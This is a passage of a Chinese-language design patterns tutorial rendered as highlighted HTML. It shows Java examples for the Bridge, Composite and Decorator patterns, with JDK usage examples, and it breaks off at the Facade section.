keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Sony</span> <span class="token keyword">extends</span> <span class="token class-name">TV</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Sony.on()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Sony.off()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Sony.tuneChannel()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RCA</span> <span class="token keyword">extends</span> <span class="token class-name">TV</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"RCA.on()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"RCA.off()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"RCA.tuneChannel()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">RemoteControl</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> TV tv<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">RemoteControl</span><span class="token punctuation">(</span>TV tv<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>tv <span class="token operator">=</span> tv<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteRemoteControl1</span> <span class="token keyword">extends</span> <span class="token class-name">RemoteControl</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">ConcreteRemoteControl1</span><span class="token punctuation">(</span>TV tv<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>tv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ConcreteRemoteControl1.on()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tv<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ConcreteRemoteControl1.off()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tv<span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ConcreteRemoteControl1.tuneChannel()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tv<span class="token punctuation">.</span><span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteRemoteControl2</span> <span class="token keyword">extends</span> <span class="token class-name">RemoteControl</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">ConcreteRemoteControl2</span><span class="token punctuation">(</span>TV tv<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>tv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ConcreteRemoteControl2.on()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tv<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ConcreteRemoteControl2.off()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tv<span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ConcreteRemoteControl2.tuneChannel()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tv<span class="token punctuation">.</span><span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RemoteControl remoteControl1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteRemoteControl1</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RCA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        remoteControl1<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        remoteControl1<span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        remoteControl1<span class="token punctuation">.</span><span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        RemoteControl remoteControl2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteRemoteControl2</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Sony</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         remoteControl2<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         remoteControl2<span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         remoteControl2<span class="token punctuation">.</span><span class="token function">tuneChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="JDK-16"><a href="#JDK-16" class="headerlink" title="JDK"></a>JDK</h3><ul><li>AWT (It provides an abstraction layer which maps onto the native OS the windowing support.)</li><li>JDBC</li></ul><h2 id="3-组合（Composite）"><a href="#3-组合（Composite）" class="headerlink" title="3. 组合（Composite）"></a>3. 组合（Composite）</h2><h3 id="Intent-20"><a href="#Intent-20" class="headerlink" title="Intent"></a>Intent</h3><p>将对象组合成树形结构来表示“整体/部分”层次关系，允许用户以相同的方式处理单独对象和组合对象。</p><h3 id="Class-Diagram-20"><a href="#Class-Diagram-20" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p>组件（Component）类是组合类（Composite）和叶子类（Leaf）的父类，可以把组合类看成是树的中间节点。</p><p>组合对象拥有一个或者多个组件对象，因此组合对象的操作可以委托给组件对象去处理，而组件对象可以是另一个组合对象或者叶子对象。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/77931a4b-72ba-4016-827d-84b9a6845a51.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/77931a4b-72ba-4016-827d-84b9a6845a51.png" alt="img"></a></p><h3 id="Implementation-20"><a href="#Implementation-20" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Component</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">int</span> level<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span>Component component<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span>Component component<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Composite</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>Component<span class="token operator">></span> child<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Composite</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        child <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">int</span> level<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> level<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Composite:"</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Component component <span class="token operator">:</span> child<span class="token punctuation">)</span> <span class="token punctuation">{</span>            component<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>level <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span>Component component<span class="token punctuation">)</span> <span class="token punctuation">{</span>        child<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>component<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span>Component component<span class="token punctuation">)</span> <span class="token punctuation">{</span>        child<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>component<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Leaf</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">Leaf</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">int</span> level<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> level<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"left:"</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span>Component component<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnsupportedOperationException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 牺牲透明性换取单一职责原则，这样就不用考虑是叶子节点还是组合节点</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span>Component component<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnsupportedOperationException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Composite root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Composite</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Component node1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Leaf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Component node2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Composite</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Component node3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Leaf</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        root<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node1<span class="token punctuation">)</span><span class="token punctuation">;</span>        root<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node2<span class="token punctuation">)</span><span class="token punctuation">;</span>        root<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node3<span class="token punctuation">)</span><span class="token punctuation">;</span>        Component node21 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Leaf</span><span class="token punctuation">(</span><span class="token string">"21"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Component node22 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Composite</span><span class="token punctuation">(</span><span class="token string">"22"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        node2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node21<span class="token punctuation">)</span><span class="token punctuation">;</span>        node2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node22<span class="token punctuation">)</span><span class="token punctuation">;</span>        Component node221 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Leaf</span><span class="token punctuation">(</span><span class="token string">"221"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        node22<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node221<span class="token punctuation">)</span><span class="token punctuation">;</span>        root<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>Composite<span class="token operator">:</span>root<span class="token operator">--</span>left<span class="token operator">:</span><span class="token number">1</span><span class="token operator">--</span>Composite<span class="token operator">:</span><span class="token number">2</span><span class="token operator">--</span><span class="token operator">--</span>left<span class="token operator">:</span><span class="token number">21</span><span class="token operator">--</span><span class="token operator">--</span>Composite<span class="token operator">:</span><span class="token number">22</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>left<span class="token operator">:</span><span class="token number">221</span><span class="token operator">--</span>left<span class="token operator">:</span><span class="token number">3</span></code></pre><h3 id="JDK-17"><a href="#JDK-17" class="headerlink" title="JDK"></a>JDK</h3><ul><li>javax.swing.JComponent#add(Component)</li><li>java.awt.Container#add(Component)</li><li>java.util.Map#putAll(Map)</li><li>java.util.List#addAll(Collection)</li><li>java.util.Set#addAll(Collection)</li></ul><h2 id="4-装饰（Decorator）"><a href="#4-装饰（Decorator）" class="headerlink" title="4. 装饰（Decorator）"></a>4. 装饰（Decorator）</h2><h3 id="Intent-21"><a href="#Intent-21" class="headerlink" title="Intent"></a>Intent</h3><p>为对象动态添加功能。</p><h3 id="Class-Diagram-21"><a href="#Class-Diagram-21" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p>装饰者（Decorator）和具体组件（ConcreteComponent）都继承自组件（Component），具体组件的方法实现不需要依赖于其它对象，而装饰者组合了一个组件，这样它可以装饰其它装饰者或者具体组件。所谓装饰，就是把这个装饰者套在被装饰者之上，从而动态扩展被装饰者的功能。装饰者的方法有一部分是自己的，这属于它的功能，然后调用被装饰者的方法实现，从而也保留了被装饰者的功能。可以看到，具体组件应当是装饰层次的最低层，因为只有具体组件的方法实现不需要依赖于其它对象。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/137c593d-0a9e-47b8-a9e6-b71f540b82dd.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/137c593d-0a9e-47b8-a9e6-b71f540b82dd.png" alt="img"></a></p><h3 id="Implementation-21"><a href="#Implementation-21" class="headerlink" title="Implementation"></a>Implementation</h3><p>设计不同种类的饮料，饮料可以添加配料，比如可以添加牛奶，并且支持动态添加新配料。每增加一种配料，该饮料的价格就会增加，要求计算一种饮料的价格。</p><p>下图表示在 DarkRoast 饮料上新增新添加 Mocha 配料，之后又添加了 Whip 配料。DarkRoast 被 Mocha 包裹，Mocha 又被 Whip 包裹。它们都继承自相同父类，都有 cost() 方法，外层类的 cost() 方法调用了内层类的 cost() 方法。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c9cfd600-bc91-4f3a-9f99-b42f88a5bb24.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c9cfd600-bc91-4f3a-9f99-b42f88a5bb24.jpg" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Beverage</span> <span class="token punctuation">{</span>    <span class="token keyword">double</span> <span class="token function">cost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DarkRoast</span> <span class="token keyword">implements</span> <span class="token class-name">Beverage</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">cost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HouseBlend</span> <span class="token keyword">implements</span> <span class="token class-name">Beverage</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">cost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">CondimentDecorator</span> <span class="token keyword">implements</span> <span class="token class-name">Beverage</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> Beverage beverage<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Milk</span> <span class="token keyword">extends</span> <span class="token class-name">CondimentDecorator</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">Milk</span><span class="token punctuation">(</span>Beverage beverage<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>beverage <span class="token operator">=</span> beverage<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">cost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> beverage<span class="token punctuation">.</span><span class="token function">cost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Mocha</span> <span class="token keyword">extends</span> <span class="token class-name">CondimentDecorator</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">Mocha</span><span class="token punctuation">(</span>Beverage beverage<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>beverage <span class="token operator">=</span> beverage<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">cost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> beverage<span class="token punctuation">.</span><span class="token function">cost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Beverage beverage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HouseBlend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        beverage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mocha</span><span class="token punctuation">(</span>beverage<span class="token punctuation">)</span><span class="token punctuation">;</span>        beverage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Milk</span><span class="token punctuation">(</span>beverage<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>beverage<span class="token punctuation">.</span><span class="token function">cost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token number">3.0</span></code></pre><h3 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h3><p>类应该对扩展开放，对修改关闭：也就是添加新功能时不需要修改代码。饮料可以动态添加新的配料，而不需要去修改饮料的代码。</p><p>不可能把所有的类设计成都满足这一原则，应当把该原则应用于最有可能发生改变的地方。</p><h3 id="JDK-18"><a href="#JDK-18" class="headerlink" title="JDK"></a>JDK</h3><ul><li>java.io.BufferedInputStream(InputStream)</li><li>java.io.DataInputStream(InputStream)</li><li>java.io.BufferedOutputStream(OutputStream)</li><li>java.util.zip.ZipOutputStream(OutputStream)</li><li>java.util.Collections#checked<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes">List|Map|Set|SortedSet|SortedMap</a></li></ul><h2 id="5-外观（Facade）"><a href="#5-外观（Facade）" class="headerlink" title="5. 外观（Facade）"></a>5. 外观（Facade）</h2><h3 id="Intent-22"><a href="#Intent-22" class="headerlink" 